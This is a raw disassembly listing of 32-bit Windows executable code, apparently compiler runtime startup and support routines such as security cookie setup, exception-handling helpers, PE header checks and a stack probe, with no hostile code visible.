  4084a5:	39 1d d4 0c 41 00    	cmp    %ebx,0x410cd4
  4084ab:	75 07                	jne    0x4084b4
  4084ad:	50                   	push   %eax
  4084ae:	ff 15 dc a1 40 00    	call   *0x40a1dc
  4084b4:	39 1d e4 0c 41 00    	cmp    %ebx,0x410ce4
  4084ba:	75 06                	jne    0x4084c2
  4084bc:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  4084c2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4084c9:	a1 e0 0c 41 00       	mov    0x410ce0,%eax
  4084ce:	e8 32 03 00 00       	call   0x408805
  4084d3:	c3                   	ret
  4084d4:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  4084d9:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  4084e0:	74 04                	je     0x4084e6
  4084e2:	33 c0                	xor    %eax,%eax
  4084e4:	eb 35                	jmp    0x40851b
  4084e6:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4084eb:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  4084f2:	45 00 00 
  4084f5:	75 eb                	jne    0x4084e2
  4084f7:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  4084fc:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  408503:	75 dd                	jne    0x4084e2
  408505:	83 b8 74 00 40 00 0e 	cmpl   $0xe,0x400074(%eax)
  40850c:	76 d4                	jbe    0x4084e2
  40850e:	33 c9                	xor    %ecx,%ecx
  408510:	39 88 e8 00 40 00    	cmp    %ecx,0x4000e8(%eax)
  408516:	0f 95 c1             	setne  %cl
  408519:	8b c1                	mov    %ecx,%eax
  40851b:	6a 02                	push   $0x2
  40851d:	a3 d4 0c 41 00       	mov    %eax,0x410cd4
  408522:	ff 15 b4 a1 40 00    	call   *0x40a1b4
  408528:	59                   	pop    %ecx
  408529:	6a ff                	push   $0xffffffff
  40852b:	ff 15 7c a0 40 00    	call   *0x40a07c
  408531:	8b 0d 18 10 41 00    	mov    0x411018,%ecx
  408537:	a3 a8 22 41 00       	mov    %eax,0x4122a8
  40853c:	a3 ac 22 41 00       	mov    %eax,0x4122ac
  408541:	a1 b8 a1 40 00       	mov    0x40a1b8,%eax
  408546:	89 08                	mov    %ecx,(%eax)
  408548:	a1 bc a1 40 00       	mov    0x40a1bc,%eax
  40854d:	8b 0d 14 10 41 00    	mov    0x411014,%ecx
  408553:	89 08                	mov    %ecx,(%eax)
  408555:	e8 3a 03 00 00       	call   0x408894
  40855a:	e8 11 05 00 00       	call   0x408a70
  40855f:	83 3d 2c e0 40 00 00 	cmpl   $0x0,0x40e02c
  408566:	75 0c                	jne    0x408574
  408568:	68 70 8a 40 00       	push   $0x408a70
  40856d:	ff 15 c0 a1 40 00    	call   *0x40a1c0
  408573:	59                   	pop    %ecx
  408574:	e8 cf 04 00 00       	call   0x408a48
  408579:	83 3d 28 e0 40 00 ff 	cmpl   $0xffffffff,0x40e028
  408580:	75 09                	jne    0x40858b
  408582:	6a ff                	push   $0xffffffff
  408584:	ff 15 c4 a1 40 00    	call   *0x40a1c4
  40858a:	59                   	pop    %ecx
  40858b:	33 c0                	xor    %eax,%eax
  40858d:	c3                   	ret
  40858e:	e8 e0 04 00 00       	call   0x408a73
  408593:	e9 6b fd ff ff       	jmp    0x408303
  408598:	ff 25 58 a2 40 00    	jmp    *0x40a258
  40859e:	50                   	push   %eax
  40859f:	64 ff 35 00 00 00 00 	push   %fs:0x0
  4085a6:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4085aa:	2b 64 24 0c          	sub    0xc(%esp),%esp
  4085ae:	53                   	push   %ebx
  4085af:	56                   	push   %esi
  4085b0:	57                   	push   %edi
  4085b1:	89 28                	mov    %ebp,(%eax)
  4085b3:	8b e8                	mov    %eax,%ebp
  4085b5:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4085ba:	33 c5                	xor    %ebp,%eax
  4085bc:	50                   	push   %eax
  4085bd:	ff 75 fc             	push   -0x4(%ebp)
  4085c0:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4085c7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4085ca:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4085d0:	c3                   	ret
  4085d1:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4085d4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4085db:	59                   	pop    %ecx
  4085dc:	5f                   	pop    %edi
  4085dd:	5f                   	pop    %edi
  4085de:	5e                   	pop    %esi
  4085df:	5b                   	pop    %ebx
  4085e0:	8b e5                	mov    %ebp,%esp
  4085e2:	5d                   	pop    %ebp
  4085e3:	51                   	push   %ecx
  4085e4:	c3                   	ret
  4085e5:	8b ff                	mov    %edi,%edi
  4085e7:	55                   	push   %ebp
  4085e8:	8b ec                	mov    %esp,%ebp
  4085ea:	81 ec 28 03 00 00    	sub    $0x328,%esp
  4085f0:	a3 f0 0d 41 00       	mov    %eax,0x410df0
  4085f5:	89 0d ec 0d 41 00    	mov    %ecx,0x410dec
  4085fb:	89 15 e8 0d 41 00    	mov    %edx,0x410de8
  408601:	89 1d e4 0d 41 00    	mov    %ebx,0x410de4
  408607:	89 35 e0 0d 41 00    	mov    %esi,0x410de0
  40860d:	89 3d dc 0d 41 00    	mov    %edi,0x410ddc
  408613:	66 8c 15 08 0e 41 00 	data16 mov %ss,0x410e08
  40861a:	66 8c 0d fc 0d 41 00 	data16 mov %cs,0x410dfc
  408621:	66 8c 1d d8 0d 41 00 	data16 mov %ds,0x410dd8
  408628:	66 8c 05 d4 0d 41 00 	data16 mov %es,0x410dd4
  40862f:	66 8c 25 d0 0d 41 00 	data16 mov %fs,0x410dd0
  408636:	66 8c 2d cc 0d 41 00 	data16 mov %gs,0x410dcc
  40863d:	9c                   	pushf
  40863e:	8f 05 00 0e 41 00    	pop    0x410e00
  408644:	8b 45 00             	mov    0x0(%ebp),%eax
  408647:	a3 f4 0d 41 00       	mov    %eax,0x410df4
  40864c:	8b 45 04             	mov    0x4(%ebp),%eax
  40864f:	a3 f8 0d 41 00       	mov    %eax,0x410df8
  408654:	8d 45 08             	lea    0x8(%ebp),%eax
  408657:	a3 04 0e 41 00       	mov    %eax,0x410e04
  40865c:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  408662:	c7 05 40 0d 41 00 01 	movl   $0x10001,0x410d40
  408669:	00 01 00 
  40866c:	a1 f8 0d 41 00       	mov    0x410df8,%eax
  408671:	a3 f4 0c 41 00       	mov    %eax,0x410cf4
  408676:	c7 05 e8 0c 41 00 09 	movl   $0xc0000409,0x410ce8
  40867d:	04 00 c0 
  408680:	c7 05 ec 0c 41 00 01 	movl   $0x1,0x410cec
  408687:	00 00 00 
  40868a:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40868f:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  408695:	a1 1c e0 40 00       	mov    0x40e01c,%eax
  40869a:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  4086a0:	ff 15 54 a0 40 00    	call   *0x40a054
  4086a6:	a3 38 0d 41 00       	mov    %eax,0x410d38
  4086ab:	6a 01                	push   $0x1
  4086ad:	e8 5c 04 00 00       	call   0x408b0e
  4086b2:	59                   	pop    %ecx
  4086b3:	6a 00                	push   $0x0
  4086b5:	ff 15 58 a0 40 00    	call   *0x40a058
  4086bb:	68 64 a3 40 00       	push   $0x40a364
  4086c0:	ff 15 5c a0 40 00    	call   *0x40a05c
  4086c6:	83 3d 38 0d 41 00 00 	cmpl   $0x0,0x410d38
  4086cd:	75 08                	jne    0x4086d7
  4086cf:	6a 01                	push   $0x1
  4086d1:	e8 38 04 00 00       	call   0x408b0e
  4086d6:	59                   	pop    %ecx
  4086d7:	68 09 04 00 c0       	push   $0xc0000409
  4086dc:	ff 15 60 a0 40 00    	call   *0x40a060
  4086e2:	50                   	push   %eax
  4086e3:	ff 15 64 a0 40 00    	call   *0x40a064
  4086e9:	c9                   	leave
  4086ea:	c3                   	ret
  4086eb:	6a 14                	push   $0x14
  4086ed:	68 80 af 40 00       	push   $0x40af80
  4086f2:	e8 c9 00 00 00       	call   0x4087c0
  4086f7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4086fb:	ff 4d 10             	decl   0x10(%ebp)
  4086fe:	78 3a                	js     0x40873a
  408700:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408703:	2b 4d 0c             	sub    0xc(%ebp),%ecx
  408706:	89 4d 08             	mov    %ecx,0x8(%ebp)
  408709:	ff 55 14             	call   *0x14(%ebp)
  40870c:	eb ed                	jmp    0x4086fb
  40870e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408711:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  408714:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408717:	8b 00                	mov    (%eax),%eax
  408719:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40871c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40871f:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  408725:	74 0b                	je     0x408732
  408727:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40872e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408731:	c3                   	ret
  408732:	e8 dd 03 00 00       	call   0x408b14
  408737:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40873a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408741:	e8 bf 00 00 00       	call   0x408805
  408746:	c2 10 00             	ret    $0x10
  408749:	6a 0c                	push   $0xc
  40874b:	68 a0 af 40 00       	push   $0x40afa0
  408750:	e8 6b 00 00 00       	call   0x4087c0
  408755:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  408759:	8b 75 0c             	mov    0xc(%ebp),%esi
  40875c:	8b c6                	mov    %esi,%eax
  40875e:	0f af 45 10          	imul   0x10(%ebp),%eax
  408762:	01 45 08             	add    %eax,0x8(%ebp)
  408765:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408769:	ff 4d 10             	decl   0x10(%ebp)
  40876c:	78 0b                	js     0x408779
  40876e:	29 75 08             	sub    %esi,0x8(%ebp)
  408771:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408774:	ff 55 14             	call   *0x14(%ebp)
  408777:	eb f0                	jmp    0x408769
  408779:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  408780:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408787:	e8 08 00 00 00       	call   0x408794
  40878c:	e8 74 00 00 00       	call   0x408805
  408791:	c2 10 00             	ret    $0x10
  408794:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  408798:	75 11                	jne    0x4087ab
  40879a:	ff 75 14             	push   0x14(%ebp)
  40879d:	ff 75 10             	push   0x10(%ebp)
  4087a0:	ff 75 0c             	push   0xc(%ebp)
  4087a3:	ff 75 08             	push   0x8(%ebp)
  4087a6:	e8 40 ff ff ff       	call   0x4086eb
  4087ab:	c3                   	ret
  4087ac:	ff 25 5c a2 40 00    	jmp    *0x40a25c
  4087b2:	ff 25 60 a2 40 00    	jmp    *0x40a260
  4087b8:	ff 25 64 a2 40 00    	jmp    *0x40a264
  4087be:	cc                   	int3
  4087bf:	cc                   	int3
  4087c0:	68 19 88 40 00       	push   $0x408819
  4087c5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  4087cc:	8b 44 24 10          	mov    0x10(%esp),%eax
  4087d0:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4087d4:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  4087d8:	2b e0                	sub    %eax,%esp
  4087da:	53                   	push   %ebx
  4087db:	56                   	push   %esi
  4087dc:	57                   	push   %edi
  4087dd:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4087e2:	31 45 fc             	xor    %eax,-0x4(%ebp)
  4087e5:	33 c5                	xor    %ebp,%eax
  4087e7:	50                   	push   %eax
  4087e8:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4087eb:	ff 75 f8             	push   -0x8(%ebp)
  4087ee:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4087f1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4087f8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4087fb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4087fe:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  408804:	c3                   	ret
  408805:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408808:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40880f:	59                   	pop    %ecx
  408810:	5f                   	pop    %edi
  408811:	5f                   	pop    %edi
  408812:	5e                   	pop    %esi
  408813:	5b                   	pop    %ebx
  408814:	8b e5                	mov    %ebp,%esp
  408816:	5d                   	pop    %ebp
  408817:	51                   	push   %ecx
  408818:	c3                   	ret
  408819:	8b ff                	mov    %edi,%edi
  40881b:	55                   	push   %ebp
  40881c:	8b ec                	mov    %esp,%ebp
  40881e:	ff 75 14             	push   0x14(%ebp)
  408821:	ff 75 10             	push   0x10(%ebp)
  408824:	ff 75 0c             	push   0xc(%ebp)
  408827:	ff 75 08             	push   0x8(%ebp)
  40882a:	68 80 81 40 00       	push   $0x408180
  40882f:	68 18 e0 40 00       	push   $0x40e018
  408834:	e8 e7 02 00 00       	call   0x408b20
  408839:	83 c4 18             	add    $0x18,%esp
  40883c:	5d                   	pop    %ebp
  40883d:	c3                   	ret
  40883e:	8b ff                	mov    %edi,%edi
  408840:	55                   	push   %ebp
  408841:	8b ec                	mov    %esp,%ebp
  408843:	8b 45 08             	mov    0x8(%ebp),%eax
  408846:	8b 00                	mov    (%eax),%eax
  408848:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  40884e:	75 2a                	jne    0x40887a
  408850:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  408854:	75 24                	jne    0x40887a
  408856:	8b 40 14             	mov    0x14(%eax),%eax
  408859:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  40885e:	74 15                	je     0x408875
  408860:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  408865:	74 0e                	je     0x408875
  408867:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  40886c:	74 07                	je     0x408875
  40886e:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  408873:	75 05                	jne    0x40887a
  408875:	e8 9a 02 00 00       	call   0x408b14
  40887a:	33 c0                	xor    %eax,%eax
  40887c:	5d                   	pop    %ebp
  40887d:	c2 04 00             	ret    $0x4
  408880:	68 3e 88 40 00       	push   $0x40883e
  408885:	ff 15 58 a0 40 00    	call   *0x40a058
  40888b:	33 c0                	xor    %eax,%eax
  40888d:	c3                   	ret
  40888e:	ff 25 6c a2 40 00    	jmp    *0x40a26c
  408894:	8b ff                	mov    %edi,%edi
  408896:	56                   	push   %esi
  408897:	b8 00 af 40 00       	mov    $0x40af00,%eax
  40889c:	be 00 af 40 00       	mov    $0x40af00,%esi
  4088a1:	57                   	push   %edi
  4088a2:	8b f8                	mov    %eax,%edi
  4088a4:	3b c6                	cmp    %esi,%eax
  4088a6:	73 0f                	jae    0x4088b7
  4088a8:	8b 07                	mov    (%edi),%eax
  4088aa:	85 c0                	test   %eax,%eax
  4088ac:	74 02                	je     0x4088b0
  4088ae:	ff d0                	call   *%eax
  4088b0:	83 c7 04             	add    $0x4,%edi
  4088b3:	3b fe                	cmp    %esi,%edi
  4088b5:	72 f1                	jb     0x4088a8
  4088b7:	5f                   	pop    %edi
  4088b8:	5e                   	pop    %esi
  4088b9:	c3                   	ret
  4088ba:	8b ff                	mov    %edi,%edi
  4088bc:	56                   	push   %esi
  4088bd:	b8 08 af 40 00       	mov    $0x40af08,%eax
  4088c2:	be 08 af 40 00       	mov    $0x40af08,%esi
  4088c7:	57                   	push   %edi
  4088c8:	8b f8                	mov    %eax,%edi
  4088ca:	3b c6                	cmp    %esi,%eax
  4088cc:	73 0f                	jae    0x4088dd
  4088ce:	8b 07                	mov    (%edi),%eax
  4088d0:	85 c0                	test   %eax,%eax
  4088d2:	74 02                	je     0x4088d6
  4088d4:	ff d0                	call   *%eax
  4088d6:	83 c7 04             	add    $0x4,%edi
  4088d9:	3b fe                	cmp    %esi,%edi
  4088db:	72 f1                	jb     0x4088ce
  4088dd:	5f                   	pop    %edi
  4088de:	5e                   	pop    %esi
  4088df:	c3                   	ret
  4088e0:	ff 25 d8 a1 40 00    	jmp    *0x40a1d8
  4088e6:	cc                   	int3
  4088e7:	cc                   	int3
  4088e8:	cc                   	int3
  4088e9:	cc                   	int3
  4088ea:	cc                   	int3
  4088eb:	cc                   	int3
  4088ec:	cc                   	int3
  4088ed:	cc                   	int3
  4088ee:	cc                   	int3
  4088ef:	cc                   	int3
  4088f0:	8b ff                	mov    %edi,%edi
  4088f2:	55                   	push   %ebp
  4088f3:	8b ec                	mov    %esp,%ebp
  4088f5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4088f8:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  4088fd:	66 39 01             	cmp    %ax,(%ecx)
  408900:	74 04                	je     0x408906
  408902:	33 c0                	xor    %eax,%eax
  408904:	5d                   	pop    %ebp
  408905:	c3                   	ret
  408906:	8b 41 3c             	mov    0x3c(%ecx),%eax
  408909:	03 c1                	add    %ecx,%eax
  40890b:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  408911:	75 ef                	jne    0x408902
  408913:	33 d2                	xor    %edx,%edx
  408915:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  40891a:	66 39 48 18          	cmp    %cx,0x18(%eax)
  40891e:	0f 94 c2             	sete   %dl
  408921:	8b c2                	mov    %edx,%eax
  408923:	5d                   	pop    %ebp
  408924:	c3                   	ret
  408925:	cc                   	int3
  408926:	cc                   	int3
  408927:	cc                   	int3
  408928:	cc                   	int3
  408929:	cc                   	int3
  40892a:	cc                   	int3
  40892b:	cc                   	int3
  40892c:	cc                   	int3
  40892d:	cc                   	int3
  40892e:	cc                   	int3
  40892f:	cc                   	int3
  408930:	8b ff                	mov    %edi,%edi
  408932:	55                   	push   %ebp
  408933:	8b ec                	mov    %esp,%ebp
  408935:	8b 45 08             	mov    0x8(%ebp),%eax
  408938:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40893b:	03 c8                	add    %eax,%ecx
  40893d:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  408941:	53                   	push   %ebx
  408942:	56                   	push   %esi
  408943:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
  408947:	33 d2                	xor    %edx,%edx
  408949:	57                   	push   %edi
  40894a:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
  40894e:	85 f6                	test   %esi,%esi
  408950:	74 1b                	je     0x40896d
  408952:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408955:	8b 48 0c             	mov    0xc(%eax),%ecx
  408958:	3b f9                	cmp    %ecx,%edi
  40895a:	72 09                	jb     0x408965
  40895c:	8b 58 08             	mov    0x8(%eax),%ebx
  40895f:	03 d9                	add    %ecx,%ebx
  408961:	3b fb                	cmp    %ebx,%edi
  408963:	72 0a                	jb     0x40896f
  408965:	42                   	inc    %edx
  408966:	83 c0 28             	add    $0x28,%eax
  408969:	3b d6                	cmp    %esi,%edx
  40896b:	72 e8                	jb     0x408955
  40896d:	33 c0                	xor    %eax,%eax
  40896f:	5f                   	pop    %edi
  408970:	5e                   	pop    %esi
  408971:	5b                   	pop    %ebx
  408972:	5d                   	pop    %ebp
  408973:	c3                   	ret
  408974:	cc                   	int3
  408975:	cc                   	int3
  408976:	cc                   	int3
  408977:	cc                   	int3
  408978:	cc                   	int3
  408979:	cc                   	int3
  40897a:	cc                   	int3
  40897b:	cc                   	int3
  40897c:	cc                   	int3
  40897d:	cc                   	int3
  40897e:	cc                   	int3
  40897f:	cc                   	int3
  408980:	8b ff                	mov    %edi,%edi
  408982:	55                   	push   %ebp
  408983:	8b ec                	mov    %esp,%ebp
  408985:	6a fe                	push   $0xfffffffe
  408987:	68 c0 af 40 00       	push   $0x40afc0
  40898c:	68 19 88 40 00       	push   $0x408819
  408991:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  408997:	50                   	push   %eax
  408998:	83 ec 08             	sub    $0x8,%esp
  40899b:	53                   	push   %ebx
  40899c:	56                   	push   %esi
  40899d:	57                   	push   %edi
  40899e:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4089a3:	31 45 f8             	xor    %eax,-0x8(%ebp)
  4089a6:	33 c5                	xor    %ebp,%eax
  4089a8:	50                   	push   %eax
  4089a9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4089ac:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4089b2:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4089b5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4089bc:	68 00 00 40 00       	push   $0x400000
  4089c1:	e8 2a ff ff ff       	call   0x4088f0
  4089c6:	83 c4 04             	add    $0x4,%esp
  4089c9:	85 c0                	test   %eax,%eax
  4089cb:	74 54                	je     0x408a21
  4089cd:	8b 45 08             	mov    0x8(%ebp),%eax
  4089d0:	2d 00 00 40 00       	sub    $0x400000,%eax
  4089d5:	50                   	push   %eax
  4089d6:	68 00 00 40 00       	push   $0x400000
  4089db:	e8 50 ff ff ff       	call   0x408930
  4089e0:	83 c4 08             	add    $0x8,%esp
  4089e3:	85 c0                	test   %eax,%eax
  4089e5:	74 3a                	je     0x408a21
  4089e7:	8b 40 24             	mov    0x24(%eax),%eax
  4089ea:	c1 e8 1f             	shr    $0x1f,%eax
  4089ed:	f7 d0                	not    %eax
  4089ef:	83 e0 01             	and    $0x1,%eax
  4089f2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4089f9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4089fc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  408a03:	59                   	pop    %ecx
  408a04:	5f                   	pop    %edi
  408a05:	5e                   	pop    %esi
  408a06:	5b                   	pop    %ebx
  408a07:	8b e5                	mov    %ebp,%esp
  408a09:	5d                   	pop    %ebp
  408a0a:	c3                   	ret
  408a0b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408a0e:	8b 08                	mov    (%eax),%ecx
  408a10:	33 d2                	xor    %edx,%edx
  408a12:	81 39 05 00 00 c0    	cmpl   $0xc0000005,(%ecx)
  408a18:	0f 94 c2             	sete   %dl
  408a1b:	8b c2                	mov    %edx,%eax
  408a1d:	c3                   	ret
  408a1e:	8b 65 e8             	mov    -0x18(%ebp),%esp
  408a21:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408a28:	33 c0                	xor    %eax,%eax
  408a2a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408a2d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  408a34:	59                   	pop    %ecx
  408a35:	5f                   	pop    %edi
  408a36:	5e                   	pop    %esi
  408a37:	5b                   	pop    %ebx
  408a38:	8b e5                	mov    %ebp,%esp
  408a3a:	5d                   	pop    %ebp
  408a3b:	c3                   	ret
  408a3c:	ff 25 cc a1 40 00    	jmp    *0x40a1cc
  408a42:	ff 25 c8 a1 40 00    	jmp    *0x40a1c8
  408a48:	8b ff                	mov    %edi,%edi
  408a4a:	56                   	push   %esi
  408a4b:	68 00 00 03 00       	push   $0x30000
  408a50:	68 00 00 01 00       	push   $0x10000
  408a55:	33 f6                	xor    %esi,%esi
  408a57:	56                   	push   %esi
  408a58:	e8 cf 00 00 00       	call   0x408b2c
  408a5d:	83 c4 0c             	add    $0xc,%esp
  408a60:	85 c0                	test   %eax,%eax
  408a62:	74 0a                	je     0x408a6e
  408a64:	56                   	push   %esi
  408a65:	56                   	push   %esi
  408a66:	56                   	push   %esi
  408a67:	56                   	push   %esi
  408a68:	56                   	push   %esi
  408a69:	e8 b8 00 00 00       	call   0x408b26
  408a6e:	5e                   	pop    %esi
  408a6f:	c3                   	ret
  408a70:	33 c0                	xor    %eax,%eax
  408a72:	c3                   	ret
  408a73:	8b ff                	mov    %edi,%edi
  408a75:	55                   	push   %ebp
  408a76:	8b ec                	mov    %esp,%ebp
  408a78:	83 ec 10             	sub    $0x10,%esp
  408a7b:	a1 18 e0 40 00       	mov    0x40e018,%eax
  408a80:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  408a84:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408a88:	53                   	push   %ebx
  408a89:	57                   	push   %edi
  408a8a:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  408a8f:	bb 00 00 ff ff       	mov    $0xffff0000,%ebx
  408a94:	3b c7                	cmp    %edi,%eax
  408a96:	74 0d                	je     0x408aa5
  408a98:	85 c3                	test   %eax,%ebx
  408a9a:	74 09                	je     0x408aa5
  408a9c:	f7 d0                	not    %eax
  408a9e:	a3 1c e0 40 00       	mov    %eax,0x40e01c
  408aa3:	eb 65                	jmp    0x408b0a
  408aa5:	56                   	push   %esi
  408aa6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408aa9:	50                   	push   %eax
  408aaa:	ff 15 48 a0 40 00    	call   *0x40a048
  408ab0:	8b 75 fc             	mov    -0x4(%ebp),%esi
  408ab3:	33 75 f8             	xor    -0x8(%ebp),%esi
  408ab6:	ff 15 4c a0 40 00    	call   *0x40a04c
  408abc:	33 f0                	xor    %eax,%esi
  408abe:	ff 15 24 a0 40 00    	call   *0x40a024
  408ac4:	33 f0                	xor    %eax,%esi
  408ac6:	ff 15 84 a0 40 00    	call   *0x40a084
  408acc:	33 f0                	xor    %eax,%esi
  408ace:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408ad1:	50                   	push   %eax
  408ad2:	ff 15 50 a0 40 00    	call   *0x40a050
  408ad8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408adb:	33 45 f0             	xor    -0x10(%ebp),%eax
  408ade:	33 f0                	xor    %eax,%esi
  408ae0:	3b f7                	cmp    %edi,%esi
  408ae2:	75 07                	jne    0x408aeb
  408ae4:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  408ae9:	eb 10                	jmp    0x408afb
  408aeb:	85 f3                	test   %esi,%ebx
  408aed:	75 0c                	jne    0x408afb
  408aef:	8b c6                	mov    %esi,%eax
  408af1:	0d 11 47 00 00       	or     $0x4711,%eax
  408af6:	c1 e0 10             	shl    $0x10,%eax
  408af9:	0b f0                	or     %eax,%esi
  408afb:	89 35 18 e0 40 00    	mov    %esi,0x40e018
  408b01:	f7 d6                	not    %esi
  408b03:	89 35 1c e0 40 00    	mov    %esi,0x40e01c
  408b09:	5e                   	pop    %esi
  408b0a:	5f                   	pop    %edi
  408b0b:	5b                   	pop    %ebx
  408b0c:	c9                   	leave
  408b0d:	c3                   	ret
  408b0e:	ff 25 b0 a1 40 00    	jmp    *0x40a1b0
  408b14:	ff 25 ac a1 40 00    	jmp    *0x40a1ac
  408b1a:	ff 25 a8 a1 40 00    	jmp    *0x40a1a8
  408b20:	ff 25 a4 a1 40 00    	jmp    *0x40a1a4
  408b26:	ff 25 a0 a1 40 00    	jmp    *0x40a1a0
  408b2c:	ff 25 9c a1 40 00    	jmp    *0x40a19c
  408b32:	ff 25 94 a1 40 00    	jmp    *0x40a194
  408b38:	ff 25 90 a1 40 00    	jmp    *0x40a190
  408b3e:	cc                   	int3
  408b3f:	cc                   	int3
  408b40:	51                   	push   %ecx
  408b41:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  408b45:	2b c8                	sub    %eax,%ecx
  408b47:	1b c0                	sbb    %eax,%eax
  408b49:	f7 d0                	not    %eax
  408b4b:	23 c8                	and    %eax,%ecx
  408b4d:	8b c4                	mov    %esp,%eax
  408b4f:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  408b54:	3b c8                	cmp    %eax,%ecx
  408b56:	72 0a                	jb     0x408b62
  408b58:	8b c1                	mov    %ecx,%eax
  408b5a:	59                   	pop    %ecx
  408b5b:	94                   	xchg   %eax,%esp
  408b5c:	8b 00                	mov    (%eax),%eax
  408b5e:	89 04 24             	mov    %eax,(%esp)
  408b61:	c3                   	ret
  408b62:	2d 00 10 00 00       	sub    $0x1000,%eax
  408b67:	85 00                	test   %eax,(%eax)
  408b69:	eb e9                	jmp    0x408b54
  408b6b:	cc                   	int3
  408b6c:	ff 25 44 a2 40 00    	jmp    *0x40a244
  408b72:	cc                   	int3
  408b73:	cc                   	int3
  408b74:	cc                   	int3
  408b75:	cc                   	int3
  408b76:	cc                   	int3
  408b77:	cc                   	int3
  408b78:	cc                   	int3
  408b79:	cc                   	int3
  408b7a:	cc                   	int3
  408b7b:	cc                   	int3
  408b7c:	cc                   	int3
  408b7d:	cc                   	int3
  408b7e:	cc                   	int3
  408b7f:	cc                   	int3
  408b80:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408b83:	ff 25 28 a1 40 00    	jmp    *0x40a128
  408b89:	8b 54 24 08          	mov    0x8(%esp),%edx
  408b8d:	8d 42 0c             	lea    0xc(%edx),%eax
  408b90:	8b 4a ec             	mov    -0x14(%edx),%ecx
  408b93:	33 c8                	xor    %eax,%ecx
  408b95:	e8 e6 f5 ff ff       	call   0x408180
  408b9a:	b8 18 af 40 00       	mov    $0x40af18,%eax
  408b9f:	e9 f4 f9 ff ff       	jmp    0x408598
  408ba4:	cc                   	int3
  408ba5:	cc                   	int3
